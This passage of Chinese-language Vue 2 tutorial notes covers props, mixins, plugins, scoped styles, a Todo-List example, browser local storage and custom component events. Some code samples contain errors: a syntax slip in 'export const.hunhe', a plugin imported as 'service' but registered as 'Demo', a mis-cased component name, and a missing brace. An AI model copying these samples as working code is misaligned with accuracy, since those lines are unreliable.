props:{
    name :String,
}
//第三种方式(限制类型、限制必要性、指定默认值) :
props:{
    name:{
        type:String, //类型
        required:true, //必要性
        default:'老王' //默认值
    }
}
~~~

完整代码如下：

- 首先在App.vue中配置父组件

  ~~~vue
  <template>
  <div> 
      <Student name="李四" sex=" 女" :age="18"/>
      </div>
  </template>
  <script>
      import Student from './components/Student'
      export default {
          name: 'App',
          components:{Student}
      }
  </script>
  ~~~

  > 第三行的`:age`属性表示，将age的类型用`v-bind`转换为Number类型

- 编写子组件Student.vue

  ~~~vue
  <template>
  <div>
      <h1>{{msg}}</h1>
      <h2>学生姓名: {{name}}</h2>
      <h2>学生性别: {{sex}}</h2>
      <h2>学生年龄: {{age}}</h2>
      </div>
  </template>
  <script>
      export default{
          name:'Student',
          data(){
              return{
                  msg: '我是个尚硅谷的学生',
              }
          },
          //第种方式(只接收):
          props:['name','sex','age'],
          //第二种方式(限制类型):
          props:{
              name :String,
              age:Number,
          },
          //第三种方式(限制类型、限制必要性、指定默认值) :
          props:{
              name:{
                  type:String, //类型
                  required:true, //必要性
                  default:'老王' //默认值
              },
              age:{
                  type:String, //类型
                  required:true, //必要性
              }
          }
      }
  </script>
  ~~~

要注意的是，默认传入的类型是字符串类型，要想实现数据的类型转换，需要在父组件中用`v-bind`指令给数据转换成想要的类型。

- 传来的数据不能直接修改，要想修改需要配置方法

  ~~~html
  <template>
      <div>
          <h1>{{msg}}</h1>
          <h2>学生姓名: {{name}}</h2>
          <h2>学生性别: {{sex}}</h2>
          <h2>学生年龄: {{myAge}}</h2>
          <button @click='updateAge'>点击年龄+1</button>
      </div>
  </template>
  <script>
      export default {
          name: 'Student',
          data() { 
              return{
                  //props配置项的优先级高，所以会先获取数据，再执行这里的代码
                  myAge:this.age
              }
          },
          methods: {
              updateAge(){
                  this.myAge++
              }
          },
          //简单声明接收
          props: ['name','age','sex']
      }
  </script>
  ~~~

> 备注：props 是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。

### 5. mixin混入

> 所谓混合就是多个组件共享一个配置。
>
> 我们在编写项目的时候，经常会碰到两个组件有很多重复的代码，这时候，可以用mixin混合解决。即在外部创建一个要多个人用到的重复JavaScript代码，然后暴露，在需要的项目文件中通过`mimin`配置参数引入。该配置参数值是一个数据的类型。

- mixin.js里面编写多个项目都可以用到的代码

  ~~~JavaScript
  export const.hunhe ={
      methods:{
          showName(){
              alert(this.name)
          }
      },
  }
  ~~~

- 在项目中引用

  ~~~vue
  <template> 
  <div>
      <h2 @click="showName">学生姓名: {{name}}</h2>
      <h2>学生性别: {{sex}}</h2>
      </div>
  </template>
  <script>
      //引入一个hunhe
      import {hunhe} from '../mixin'
      export default {
          name:'School',
          data() {
              return{
                  name:'张三',
                  address:'男'
              }
          },
          mixins:[hunhe]
      }
  </script>
  ~~~

  [mixin运行结果：](https://s1.ax1x.com/2022/05/05/OmQGZR.png)

  ​                                                      [<img src="https://s1.ax1x.com/2022/05/05/OmQGZR.png" alt="OmQGZR.png" style="zoom:50%;" />](https://imgtu.com/i/OmQGZR)

- 也可以用到全局混合

  ~~~JavaScript
  import {方法1,方法2} from './mixin'
  Vue.mixin(方法1)
  Vue.mixin(方法2)
  ~~~

  在项目的main.js中配置代码如下：

  ~~~JavaScript
  //引入Vue
  import Vue from 'vue'
  //引入App
  import App from "./App . vue"
  import {hunhe,hunhe2} from './mixin'
  //关闭Vue的生产提示
  Vue. config. productionTip = false
  Vue.mixin(hunhe)
  Vue.mixin(hunhe2)
  //创建vm
  new
  Vue({
      el:'#app',
      render: h => h(App)
  })
  ~~~

- 总结：

  功能:可以把说个组件共用的配置提取成个混入对象
  使用方式:

  1. 第一步定义混合，例如:
     {
     data(){....},
     methods:{....}
     }
  2. 第二步使用混入，例如:
     - 全局混入: Vue . mixin(xx)
     - 局部混入: mixins:[' xxx']
  3. 注意：如果混合的参数，原项目有，就以原项目的为准，带挂载函数除外，所有的挂载函数都会执行。

### 6. Vue的插件

> 简单来说，插件就是指对Vue的功能的增强或补充。
>
> 比如说，让你在每个单页面的组件里，都可以调用某个方法，或者共享使用某个变量，或者在某个方法之前执行一段代码等
>
> 使用流程：
> 【声明插件】——【写插件】——【注册插件】——【使用插件】写插件和声明插件是同步的，然后注册到Vue对象中（不用担心重复注册），最后在写Vue组件的时候使用写的插件。

#### 6.1 **声明插件**

先写一个Demo.js文件，这个js文件就是插件文件，里面的基本内容如下：

~~~javascript
export default {
    install: function (Vue, options) {
        // 添加的内容写在这个函数里面
    }
};
~~~

> 其中install的第一个参数Vue表示的是Vue的实例，第二个参数表示的是一些设置选项。而options设置选项就是指，在调用这个插件时，可以传一个对象。

#### 6.2 注册插件

再写main.js通过import引入后，然后通过 `Vue.use(插件名)` 注册插件：

~~~JavaScript
//main.js
import Vue from 'vue'
import App from './App.vue'

//关键是这两行
import service from './Demo.js'
Vue.use(Demo)

new Vue({
    el: '#app',
    render: (h) => h(App)
})
~~~

> 如代码中注释所说，关键是通过import导入Demo文件，然后在创建根组件之前，让Vue对象通过use方法来注册插件Demo。

#### 6.3 写插件、使用插件

写插件有四种方法，先给出官方的代码，以下内容都是添加到上面install的函数里面的：

~~~javascript
//以下内容都是添加到上面install的函数里面的

// 1. 添加全局方法或属性
Vue.myGlobalMethod = function () {
    // 逻辑...
}
// 2. 添加全局资源
Vue.directive('my-directive', {
    bind (el, binding, vnode, oldVnode) {
        // 逻辑...
    }
    ...
})
// 3. 注入组件
Vue.mixin({
    created: function () {
        // 逻辑...
    }
    ...
})
// 4. 添加实例方法
Vue.prototype.$myMethod = function (options) {
    // 逻辑...
}
~~~

**添加实例方法或属性**
通过prototype来添加方法和属性。

- 写number.js

  ~~~JavaScript
  //让输出的数字翻倍，如果不是数字或者不能隐式转换为数字，则输出null
  Vue.prototype.doubleNumber = function (val) {
      if (typeof val === 'number') {
          return val * 2;
      } else if (!isNaN(Number(val))) {	//检查是否为非数字
          return Number(val) * 2;
      } else {
          return null
      }
  }
  ~~~

- 注册main.js

  ~~~JavaScript
  //main.js
  import Vue from 'vue'
  import App from './App.vue'
  
  //关键是这两行
  import number from './number.js'
  Vue.use(number)
  
  new Vue({
      el: '#app',
      render: (h) => h(App)
  })
  ~~~

- 用

  假设有这样一个组件：

  ~~~vue
  <template>
      <div>
          {{num}}
          <button @click="double">点击后让左边的数字翻倍</button>
      </div>
  </template>
  <script>
      export default{
          data(){
              return {
                  num: 1
              }
          },
          methods: {
              double: function () {
                  //这里的this.doubleNumber()方法就是上面写的组件里的方法
                  this.num = this.doubleNumber(this.num);
              }
          }
      }
  </script>
  ~~~

  我们便可以通过点击button按钮，让num的值，在每次点击都翻倍了。

- 假如添加的是属性，如：

  ~~~JavaScript
  Vue.prototype.number = 1;
  ~~~

  > 此时
  >
  > 1. 不管是【按值传递类型】还是【按引用传递类型】，该变量都不会被不同组件所共享，更准确的说，假如有A、B两个组件。A组件里的number数值改变，B组件里的number数值是不会跟着改变的。因此不要想着引用这样一个变量，然后修改了A中的值，B里也自动跟着改变了；
  > 2. 当组件里没有该属性时，调用时，显示的是通过插件获取的值；当组件里有该属性时，调用时，显示的是组件里该属性的值；由此而推，函数也是这样的，组件里的同名函数总是会覆盖插件提供的函数。
  >
  > 也就是说，当插件提供一个属性时，组件里没这个属性，就用插件的属性；组件有，就用组件自己的。

- 总结：

  功能：用于增强Vue
  本质：包含install方法的一个对象，install的第一个参数是Vue, 第二个以后的参数是插件使用者传递的数据。
  定义插件：

  - ~~~javascript
    对象.install = function (Vue, options) {
        //1.添加全局过滤器
        Vue.filter(....)
        // 2.添加全局指令
        Vue.directive(....)
        // 3.配置全局混入(合)
        Vue.mixin(....)
        // 4.添加实例方法
        Vue.prototype.$myMethod = function() {..}
        Vue.prototype.$myProperty = xxxx
    }
    ~~~

  - 使用插件: Vue. use()

### 7. scoped样式

> 实现组件的私有化，不对全局造成样式污染，表示当前style属性只属于当前模块。使用方式，是在`style`标签后添加一个`scoped`属性

- 编写一个School.vue文件。在`style`样式中编写一个demo样式

  ~~~vue
  <template>
  <div class="demo">
      <h2>学校名称: {{name}}</h2>
      <h2>学校地址: {{address}}</h2>
  </div>
  </template>
  <script>
      export default {
          name: 'School',
          data() {
              return {
                  name:'尚硅谷atguigu',
                  address:'北京',
              }
          }
  </script>
  <style>
      .demo{
          background-color: skyblue;
      }
  </style>
  ~~~

- 再编写一个Student.vue文件，再`style`中也编写一个demo样式

  ~~~vue
  <template>
  <div class="test">
      <h2>学生姓名: {{name}}</h2>
      <h2>学生性别: {{sex}}</h2>
      </div>
  </template>
  <script>
      export default {
          name: 'Student',
          data() {
              return{
                  name:'张三',
                  sex:'男'
              }
          }
      }
  </script>
  <style>
      .demo{
          background-color:orange;
      }
  </style>
  ~~~

- 编写App.vue文件，组合组件

  ~~~vue
  <template>
  < div>
      <School/>
      <Student/>
      </div>
  </template>
  <script>
      import School from './components/School'
      import Student from './components/ Student'
      export default {
          name :'App',
          components:{School,student}
      }
  </script>
  ~~~

[页面运行结果：](https://s1.ax1x.com/2022/05/05/OmcLh6.png)

​										[<img src="https://s1.ax1x.com/2022/05/05/OmcLh6.png" alt="OmcLh6.png" style="zoom: 50%;" />](https://imgtu.com/i/OmcLh6)

> 此时我们可以看到页面呈现的样式是Student.vue文件中的样式，这样的原因是因为，脚手架在编译App.vue中的`import`时会将子组件中的样式合并成一个样式，此时页面就有两个叫`Demo`的样式。所以默认选择最后一个。要想解决这个问题我们就要用到scoped样式

~~~html
<!--在上面的vue文件的style样式中修改为以下代码即可-->
<style scoped></style>
~~~

[修改后的结果：](https://s1.ax1x.com/2022/05/05/OmgzGV.png)								[<img src="https://s1.ax1x.com/2022/05/05/OmgzGV.png" alt="OmgzGV.png" style="zoom: 50%;" />](https://imgtu.com/i/OmgzGV)

## 十七. 项目案例实战

组件编码流程：

1. 实现静态组件：抽取组件，使用组件实现静态页面效果
2. 展示动态数据: 
   - 数据的类型、名称是什么?
   - 数据保存在哪个组件? 
3. 交互——从绑定事件监听开始

### 1. Todo-List案例

- 创建一个App.vue文件，用来整合组件

  ~~~vue
  <template>
  <div id="root">
      <div class="todo-container">
          <div class="todo-wrap">
              <MyHeader :addTodo="addTodo"/>
              <MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"/>
              <MyFooter :todos="todos" 
                        :checkAllTodo="checkAllTodo" 
                        :clearAllTodo="clearAllTodo"/>
      </div>
      </div>
      </div>
  </template>
  
  <script>
      import MyHeader from './components/MyHeader'
      import MyList from './components/MyList'
      import MyFooter from './components/MyFooter.vue'
  
      export default {
          name: 'App',
          components: { MyHeader, MyList, MyFooter },
          data() {
              return {
                  // 由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
                  todos:[
                      {id:'001',title:'抽烟',done:true},
                      {id:'002',title:'喝酒',done:false},
                      {id:'003',title:'开车',done:true}
                  ]
              }
          },
          methods: {
              //添加一个todo
              addTodo(todoObj){
                  this.todos.unshift(todoObj)
              },
              //勾选or取消勾选一个todo
              checkTodo(id){
                  this.todos.forEach((todo)=>{
                      if(todo.id === id) todo.done = !todo.done
                  })
              },
              //删除一个todo
              deleteTodo(id){
                  this.todos = this.todos.filter( todo => todo.id !== id )
              },
              //全选or取消全选
              checkAllTodo(done){
                  this.todos.forEach((todo)=>{
                      todo.done = done
                  })
              },
              //清除所有已经完成的todo
              clearAllTodo(){
                  this.todos = this.todos.filter((todo)=>{
                      return !todo.done
                  })
              }
          }
      }
  </script>
  
  <style>
      /*base*/
      body {background: #fff;}
      .btn {
          display: inline-block;
          padding: 4px 12px;
          margin-bottom: 0;
          font-size: 14px;
          line-height: 20px;
          text-align: center;
          vertical-align: middle;
          cursor: pointer;
          box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
          border-radius: 4px;
      }
      .btn-danger {
          color: #fff;
          background-color: #da4f49;
          border: 1px solid #bd362f;
      }
      .btn-danger:hover {
          color: #fff;
          background-color: #bd362f;
      }
      .btn:focus {outline: none;}
      .todo-container {
          width: 600px;
          margin: 0 auto;
      }
      .todo-container .todo-wrap {
          padding: 10px;
          border: 1px solid #ddd;
          border-radius: 5px;
      }
  </style>
  ~~~

- 创建MyHeader.vue文件编写项目头部

  ~~~vue
  <template>
  <div class="todo-header">
      <input type="text" placeholder="请输入你的任务名称，按回车键确认" 
             v-model="title" @keyup.enter="add"/>
      </div>
  </template>
  
  <script>
      import {nanoid} from 'nanoid'
      export default {
          name:'MyHeader',
          props:['addTodo'],	// 接收从App传递过来的addTodo
          data() {
              return {
                  title:''				// 收集用户输入的title
              }
          },
          methods: {
              add(){
                  // 校验数据
                  if(!this.title.trim()) return alert('输入不能为空')
                  // 将用户的输入包装成一个todo对象
                  const todoObj = { id:nanoid(), title:this.title, done:false }
                  // 通知App组件去添加一个todo对象
                  this.addTodo(todoObj)
                  // 清空输入
                  this.title = ''
              }
          },
      }
  </script>
  
  <style scoped>
      /*header*/
      .todo-header input {
          width: 560px;
          height: 28px;
          font-size: 14px;
          border: 1px solid #ccc;
          border-radius: 4px;
          padding: 4px 7px;
      }
      .todo-header input:focus {
          outline: none;
          border-color: rgba(82, 168, 236, 0.8);
          box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
      }
  </style>
  ~~~

- 编写MyList.vue处理中间组件

  ~~~vue
  <template>
  <ul class="todo-main">
      <MyItem v-for="todoObj in todos":key="todoObj.id" 
              :todo="todoObj" :checkTodo="checkTodo":deleteTodo="deleteTodo"/>
      </ul>
  </template>
  
  <script>
      import MyItem from './MyItem'
  
      export default {
          name:'MyList',
          components:{MyItem},
          // 声明接收App传递的数据，其中todos是自己用的，checkTodo和deleteTodo是给子组件MyItem用的
          props:['todos','checkTodo','deleteTodo']
      }
  </script>
  
  <style scoped>
      /*main*/
      .todo-main {
          margin-left: 0px;
          border: 1px solid #ddd;
          border-radius: 2px;padding: 0px;
      }
      .todo-empty {
          height: 40px;
          line-height: 40px;
          border: 1px solid #ddd;
          border-radius: 2px;padding-left: 5px;
          margin-top: 10px;
      }
  </style>
  ~~~

- 编写MyItem.vue文件处理中间组件中的item项

  ~~~vue
  <template>
  <li>
      <label>
          <!-- 如下代码也能实现功能，但是不太推荐，因为有点违反原则，因为修改了props -->
          <!-- <input type="checkbox" v-model="todo.done"/> -->
          <input type="checkbox" :checked="todo.done" @change="handleCheck(todo.id)"/>  
          <span>{{ todo.title }}</span>
      </label>
      <button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
      </li>
  </template>
  
  <script>
      export default {
          name:'MyItem',
          //声明接收todo、checkTodo、deleteTodo
          props:['todo','checkTodo','deleteTodo'],
          methods: {
              // 勾选or取消勾选
              handleCheck(id){
                  this.checkTodo(id)	// 通知App组件将对应的todo对象的done值取反
              },
              // 删除
              handleDelete(id){
                  if(confirm('确定删除吗？')){
                      this.deleteTodo(id)	// 通知App组件将对应的todo对象删除
                  }
              }
          },
      }
  </script>
  
  <style scoped>
      /*item*/
      li {
          list-style: none;
          height: 36px;
          line-height: 36px;
          padding: 0 5px;
          border-bottom: 1px solid #ddd;
      }
      li label {
          float: left;
          cursor: pointer;
      }
      li label li input {
          vertical-align:middle; 
          margin-right:6px;
          position:relative;
          top: -1px;
      }
      li button {
          float: right;
          display: none;
          margin-top: 3px;
      }
      li:before {content: initial;}
      li:last-child {border-bottom: none;}
      li:hover{background-color: #ddd;}
      li:hover button{display: block;}
  </style>
  ~~~

- 编写MyFooter.vue文件处理页面底部

  ~~~vue
  <template>
  <div class="todo-footer" v-show="total">
      <label>
          <!-- <input type="checkbox" :checked="isAll" @change="checkAll"/> -->
          <input type="checkbox" v-model="isAll"/>
      </label>
      <span>
          <span>已完成{{ doneTotal }}</span> / 全部{{ total }}
      </span>
      <button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
      </div>
  </template>
  
  <script>
      export default {
          name:'MyFooter',
          props:['todos','checkAllTodo','clearAllTodo'],
          computed: {
              // 总数
              total(){
                  return this.todos.length
              },
              // 已完成数
              doneTotal(){
                  //此处使用reduce方法做条件统计
                  return this.todos.reduce((pre,todo)=> pre + (todo.done ? 1 : 0) ,0)
              },
              // 控制全选框
              isAll:{
                  //全选框是否勾选
                  get(){
                      return this.doneTotal === this.total && this.total > 0
                  },
                  //isAll被修改时set被调用
                  set(value){
                      this.checkAllTodo(value)
                  }
              }
          },
          methods: {
              /* checkAll(e){
  				this.checkAllTodo(e.target.checked)
  			} */
              //清空所有已完成
              clearAll(){
                  this.clearAllTodo()
              }
          },
      }
  </script>
  
  <style scoped>
      /*footer*/
      .todo-footer {
          height: 40px;
          line-height: 40px;
          padding-left: 6px;
          margin-top: 5px;
      }
      .todo-footer label {
          display: inline-block;
          margin-right: 20px;
          cursor: pointer;
      }
      .todo-footer label input {
          position: relative;
          top: -1px;
          vertical-align: middle;
          margin-right: 5px;
      }
      .todo-footer button {
          float: right;
          margin-top: 5px;
      }
  </style>
  ~~~

[案例运行结果：](https://s1.ax1x.com/2022/05/06/OnDISg.png)

​												[<img src="https://s1.ax1x.com/2022/05/06/OnDISg.png" alt="OnDISg.png" style="zoom:50%;" />](https://imgtu.com/i/OnDISg)

- 总结

  1. 组件化编码流程: 
     (1).拆分静态组件:组件要按照功能点拆分,命名不要与html元素冲突。
     (2).实现动态组件:考虑好数据的存放位置，数据是一个组件在用，还是一
     些组件在用:
     - 一个组件在用:放在组件自身即可。
     - 一些组件在用:放在他们共同的父组件.上(状态提升)。
     - 实现交互:从绑定事件开始。

  2. props适用于:
  (1).父组件`==>`子组件通信
  (2).子组件`==>`父组件通信(要求父先给子-一个函数)
  3. 使用v-model时要切记: v-model绑定的值不能是props传过来的值，因为props是不可以修改的!
  4. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错,但不推荐这样做。

### 2. 浏览器本地存储

> 存储内容大小一般支持 5MB 左右（不同浏览器可能还不一样） 浏览器端通过`Window.sessionStorage`和`Window.localStorage`属性来实现本地存储机制 

相关API

|               接口名               |                             描述                             |
| :--------------------------------: | :----------------------------------------------------------: |
| xxxStorage.setItem('key', 'value') | 该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值 |
|     xxxStorage.getItem('key')      |         该方法接受一个键名作为参数，返回键名对应的值         |
|    xxxStorage.removeItem('key')    |      该方法接受一个键名作为参数，并把该键名从存储中删除      |
|         xxxStorage.clear()         |                 该方法会清空存储中的所有数据                 |

备注

- SessionStorage**存储的内容会随着浏览器窗口关闭而消失**
- LocalStorage存储的内容，需要手动清除才会消失
- xxxStorage.getItem(xxx)如果 xxx 对应的 value 获取不到，那么getItem()的返回值是null
- JSON.parse(null)的结果依然是null

localStorage示例：

~~~html
<body>
    <h2>localStorage</h2>
    <button onclick="saveDate()">点我保存数据</button><br/>
    <button onclick="readDate()">点我读数据</button><br/>
    <button onclick="deleteDate()">点我删除数据</button><br/>
    <button onclick="deleteAllDate()">点我清空数据</button><br/>
</body>
<script>
    let person = {name:"JOJO",age:20}

    function saveDate(){
        localStorage.setItem('msg','localStorage')
        localStorage.setItem('person',JSON.stringify(person))
    }
    function readDate(){
        console.log(localStorage.getItem('msg'))
        const person = localStorage.getItem('person')
        console.log(JSON.parse(person))
    }
    function deleteDate(){
        localStorage.removeItem('msg')
        localStorage.removeItem('person')
    }
    function deleteAllDate(){
        localStorage.clear()
    }
</script>
~~~

sessionStorage示例：

~~~html
<body>
    <h2>sessionStorage</h2>
    <button onclick="saveDate()">点我保存数据</button><br/>
    <button onclick="readDate()">点我读数据</button><br/>
    <button onclick="deleteDate()">点我删除数据</button><br/>
    <button onclick="deleteAllDate()">点我清空数据</button><br/>
</body>
<script>
    let person = {name:"JOJO",age:20}

    function saveDate(){
        sessionStorage.setItem('msg','sessionStorage')
        sessionStorage.setItem('person',JSON.stringify(person))
    }
    function readDate(){
        console.log(sessionStorage.getItem('msg'))
        const person = sessionStorage.getItem('person')
        console.log(JSON.parse(person))
    }
    function deleteDate(){
        sessionStorage.removeItem('msg')
        sessionStorage.removeItem('person')
    }
    function deleteAllDate(){
        sessionStorage.clear()
    }
</script>
~~~

### 3. 使用本地存储优化Todo-List案例

> 可以使用本地存储将定义好的事存放在本地浏览器。

只需要更改App.vue

~~~vue
<template>
<div id="root">
    <div class="todo-container">
        <div class="todo-wrap">
            <MyHeader :addTodo="addTodo"/>
            <MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"/>
            <MyFooter :todos="todos" :checkAllTodo="checkAllTodo" :clearAllTodo="clearAllTodo"/>
    </div>
    </div>
    </div>
</template>

<script>
    import MyHeader from './components/MyHeader'
    import MyList from './components/MyList'
    import MyFooter from './components/MyFooter.vue'

    export default {
        name:'App',
        components:{MyHeader,MyList,MyFooter},
        data() {
            return {
                // 从本地存储中获得数据，null就创建空数组[]
                todos:JSON.parse(localStorage.getItem('todos')) || []
            }
        },
        methods: {
            //添加一个todo
            addTodo(todoObj){
                this.todos.unshift(todoObj)
            },
            //勾选or取消勾选一个todo
            checkTodo(id){
                this.todos.forEach((todo)=>{
                    if(todo.id === id) todo.done = !todo.done
                })
            },
            //删除一个todo
            deleteTodo(id){
                this.todos = this.todos.filter( todo => todo.id !== id )
            },
            //全选or取消全选
            checkAllTodo(done){
                this.todos.forEach((todo)=>{
                    todo.done = done
                })
            },
            //清除所有已经完成的todo
            clearAllTodo(){
                this.todos = this.todos.filter((todo)=>{
                    return !todo.done
                })
            }
        },
        // 数据发生改变就放到本地存储中，注意深度侦听，以及JSON转化为字符串
        watch: {
            todos:{
                deep:true,
                handler(value){
                    localStorage.setItem('todos',JSON.stringify(value))
                }
            }
        },
    }
</script>
~~~

## 十八. 组件自定义事件

> 一种组件间的通信方式，适用于：子组件向父组件传递信息
>
> 使用场景：子组件想给父组件传数据，那么就要在父组件中给子组件绑定自定义事件(事件的回调在A中)
>
> 1. 绑定自定义事件
>    - 第一种方式，在父组件中`<Demo @事件名="方法"/>`或`<Demo v-on:事件名="方法"/>`
>    - 第二种方式，在父组件中`this.$refs.demo.$on('事件名',方法)`
>    - 若想让自定义事件只能触发一次，可以使用once 修饰符，或$once 方法
>
> 2. 触发自定义事件：`this.$emit('事件名',数据)`
>
> 3. 解绑自定义事件：this .`$off('事件名')`
>
> 组件上也可以绑定原生DOM 事件，需要使用native 修饰符`@click. native=”show"`上面绑定自定义事件，即使绑定的是原生事件也会被认为是自定义的，需要加native ,加了后就将此事件给组件的根元素。
> 注意：通过`this.$refs.xxx.$on('事件名'，回调函数)`绑定自定义事件时，回调函数要么配置在methods中，要么用箭头函数，否则this指向会出问题

### 1. 绑定自定义事件

> 绑定自定义事件
>
> - 第一种方式，在父组件中`<Demo @事件名="方法"/>`或`<Demo v-on:事件名="方法"/>`
> - 第二种方式，在父组件中`this.$refs.demo.$on('事件名',方法)`
> - 若想让自定义事件只能触发一次，可以使用once 修饰符，或$once 方法
>
> 原则：谁绑定的自定义事件，就找谁出发事件

- 首先编写App.vue文件

  ~~~vue
  <template>
  <div class="app">
      <h1>{{ msg }}，学生姓名是:{{studentName}}</h1>
  
      <!-- 通过父组件给子组件传递函数类型的props实现子给父传递数据 -->
      <School :getSchoolName="getSchoolName"/>
  
      <!-- 通过父组件给子组件绑定一个自定义事件实现子给父传递数据（第一种写法，使用@或v-on） -->
      <Student @atguigu="getStudentName" @demo="m1"/>
  
      <!-- 通过父组件给子组件绑定一个自定义事件实现子给父传递数据（第二种写法，使用ref） -->
      <Student ref="student" @click.native="show"/> <!-- native -->
      </div>
  </template>
  
  <script>
      import Student from './components/Student'
      import School from './components/School'
  
      export default {
          name:'App',
          components:{School,Student},
          data() {
              return {
                  msg:'你好啊！',
                  studentName:''
              }
          },
          methods: {
              getSchoolName(name){
                  console.log('App收到了学校名：',name)
              },
              //收到多个参数时，第一个参数给name，剩下的给params
              getStudentName(name,...params){
                  console.log('App收到了学生名：',name,params)
                  this.studentName = name
              },
              m1(){
                  console.log('demo事件被触发了！')
              },
              show(){
                  alert(123)
              }
          },
          mounted() {
              this.$refs.student.$on('atguigu',this.getStudentName) // 绑定自定义事件
              // this.$refs.student.$once('atguigu',this.getStudentName) // 绑定自定义事件（一次性）
          },
      }
  </script>
  
  <style scoped>.app{background-color: gray;padding: 5px;}</style>
  ~~~

- 编写Student.vue文件

  ~~~vue
  <template>
  <div class="student">
      <h2>学生姓名：{{name}}</h2>
      <h2>学生性别：{{sex}}</h2>
      <h2>当前求和为：{{number}}</h2>
      <button @click="add">点我number++</button>
      <button @click="sendStudentlName">把学生名给App</button>
      <button @click="unbind">解绑atguigu事件</button>
      <button @click="death">销毁当前Student组件的实例(vc)</button>
      </div>
  </template>
  
  <script>
      export default {
          name:'Student',
          data() {
              return {
                  name:'张三',
                  sex:'男',
                  number:0
              }
          },
          methods: {
              add(){
                  console.log('add回调被调用了')
                  this.number++
              },
              sendStudentlName(){
                  // 触发Student组件实例身上的atguigu事件
                  this.$emit('atguigu',this.name,666,888,900)
                  // this.$emit('demo')
                  // this.$emit('click')
              },
              unbind(){
                  // 解绑
                  this.$off('atguigu') //解绑一个自定义事件
                  // this.$off(['atguigu','demo']) //解绑多个自定义事件
                  // this.$off() //解绑所有的自定义事件
              },
              death(){
                  // 销毁了当前Student组件的实例，销毁后所有Student实例的自定义事件全都不奏效
                  this.$destroy()
              }
          },
      }
  </script>
  
  <style lang="less" scoped>
      .student{background-color: pink;padding: 5px;margin-top: 30px;}
  </style>
  ~~~


### 2. 解绑自定义事件

> 解绑自定义事件：`this .$off('事件名')`
>
> 原则：谁绑定的自定义事件，就找谁解绑
>
> 解绑多个事件：`this .$off['事件名1','事件名2']`或者直接写为：`this .$off()`解除所有绑定事件。
>
> 注意：在给组件绑定原生事件的时候(click等)，Vue解析器会将模板解析为自定义事件，从而点击事件会失效，此时要想实现仍能发挥原生时间的作用，就需要用到`native`修饰符。具体使用以下：

~~~html
<Student ref= "student" @click.native="show"/>
~~~

加上修饰符后上面App.vue运行后结果如下：

[修饰符绑定原生事件：](https://s1.ax1x.com/2022/05/07/OlnhGt.png)									[<img src="https://s1.ax1x.com/2022/05/07/OlnhGt.png" alt="OlnhGt.png" style="zoom:50%;" />](https://imgtu.com/i/OlnhGt)

### 3. Todo-List使用自定义事件进行优化

> 由于我们之前在MyHeader.vue和Myfooter.vue中使用的子组件给父组件传送数据方式不标准：通过调用父组件函数进行传递的。这里我们用自定义事件来优化代码。

- 优化App.vue文件

  ~~~vue
  <template>
  	<div id="root">
  		<div class="todo-container">
  			<div class="todo-wrap">
  				<MyHeader @addTodo="addTodo"/>
  				<MyList :todos="todos" :checkTodo="checkTodo" :deleteTodo="deleteTodo"/>
  				<MyFooter :todos="todos" 
                    @checkAllTodo="checkAllTodo" @clearAllTodo="clearAllTodo"/>
  			</div>
  		</div>
  	</div>
  </template>
  
  <script>
  	import MyHeader from './components/MyHeader'
  	import MyList from './components/MyList'
  	import MyFooter from './components/MyFooter.vue'
  
  	export default {
  		name:'App',
  		components:{MyHeader,MyList,MyFooter},
  		data() {
  			return {
  				//由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）
  				todos:JSON.parse(localStorage.getItem('todos')) || []
  			}
  		},
  		methods: {
  			//添加一个todo
  			addTodo(todoObj){
  				this.todos.unshift(todoObj)
  			},
  			//勾选or取消勾选一个todo
  			checkTodo(id){
  				this.todos.forEach((todo)=>{
  					if(todo.id === id) todo.done = !todo.done
  				})
  			},
  			//删除一个todo
  			deleteTodo(id){
  				this.todos = this.todos.filter( todo => todo.id !== id )
  			},
  			//全选or取消全选
  			checkAllTodo(done){
  				this.todos.forEach((todo)=>{
  					todo.done = done
  				})
  			},
  			//清除所有已经完成的todo
  			clearAllTodo(){
  				this.todos = this.todos.filter((todo)=>{
  					return !todo.done
  				})
  			}
  		},
  		watch: {
  			todos:{
  				deep:true,
  				handler(value){
  					localStorage.setItem('todos',JSON.stringify(value))
  				}
  			}
  		},
  	}
  </script>
  ~~~

- MyHeader.vue

  ~~~vue
  <template>
  	<div class="todo-header">
  		<input type="text" placeholder="请输入你的任务名称，按回车键确认" 
             v-model="title" @keyup.enter="add"/>
  	</div>
  </template>
  
  <script>
  	import {nanoid} from 'nanoid'
  	export default {
  		name:'MyHeader',
  		data() {
  			return {
  				title:''	// 收集用户输入的title
  			}
  		},
  		methods: {
  			add(){
  				//校验数据
  				if(!this.title.trim()) return alert('输入不能为空')
  				//将用户的输入包装成一个todo对象
  				const todoObj = {id:nanoid(),title:this.title,done:false}
  				//通知App组件去添加一个todo对象
  				this.$emit('addTodo',todoObj)
  				//清空输入
  				this.title = ''
  			}
  		},
  	}
  </script>
  ~~~

- Myfooter.vue

  ~~~vue
  <template>
  	<div class="todo-footer" v-show="total">
  		<label>
  			<!-- <input type="checkbox" :checked="isAll" @change="checkAll"/> -->
  			<input type="checkbox" v-model="isAll"/>
  		</label>
  		<span>
  			<span>已完成{{ doneTotal }}</span> / 全部{{ total }}
  		</span>
  		<button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
  	</div>
  </template>
  
  <script>
  	export default {
  		name:'MyFooter',
  		props:['todos'],
  		computed: {
  			//总数
  			total(){
  				return this.todos.length
  			},
  			//已完成数
  			doneTotal(){
  				return this.todos.reduce((pre,todo)=> pre + (todo.done ? 1 : 0) ,0)
  			},
  			//控制全选框
  			isAll:{
  				//全选框是否勾选
  				get(){
  					return this.doneTotal === this.total && this.total > 0
  				},
  				//isAll被修改时set被调用
  				set(value){
  					// this.checkAllTodo(value)
  					this.$emit('checkAllTodo',value)
  				}
  			}
  		},
